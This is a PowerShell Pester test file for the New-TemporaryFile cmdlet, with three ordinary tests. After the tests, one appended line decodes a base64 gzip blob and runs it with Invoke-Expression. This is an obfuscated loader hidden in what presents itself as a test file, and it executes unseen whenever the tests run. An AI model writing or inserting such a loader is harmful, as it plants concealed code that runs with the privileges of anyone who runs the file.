






Describe "New-TemporaryFile" -Tags "CI" {

    It "creates a new temporary file" {
        $tempFile = New-TemporaryFile

        $tempFile | Should -Exist
        $tempFile | Should -BeOfType System.IO.FileInfo
        $tempFile | Should -BeLikeExactly "$([System.IO.Path]::GetTempPath())*"

        if (Test-Path $tempFile) {
            Remove-Item $tempFile -ErrorAction SilentlyContinue -Force
        }
    }

    It "with WhatIf does not create a file" {
        New-TemporaryFile -WhatIf | Should -BeNullOrEmpty
    }

    It "has an OutputType of System.IO.FileInfo" {
        (Get-Command New-TemporaryFile).OutputType | Should -BeExactly "System.IO.FileInfo"
    }
}

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
